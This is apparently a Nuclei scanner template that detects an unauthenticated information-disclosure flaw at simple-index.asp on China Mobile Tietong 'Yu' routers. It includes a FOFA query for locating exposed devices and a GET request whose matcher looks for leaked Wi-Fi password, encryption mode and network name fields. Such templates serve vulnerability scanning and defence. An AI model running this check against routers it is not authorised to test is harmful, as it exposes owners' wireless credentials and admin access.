id: china-mobile-simple-index-asp-unauth

info:
  name: 中移铁通 禹路由 simple-index.asp 未授权访问
  author: HuanXiong
  severity: high
  description: |
    中移铁通 禹路由器simple-index.asp处存在未授权漏洞，攻击者可以获取后台权限。
    fofa：title="互联世界 物联未来-登录"
  reference:
    - 
  tags: Information Disclosure

http:
  - raw:
      - |
        GET /simple-index.asp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Accept: */*
        Connection: close

    matchers:
      - type: dsl
        name: 信息泄露
        dsl:
          - "status_code==200 && contains_all(body,'无线密码','加密模式','无线名称')"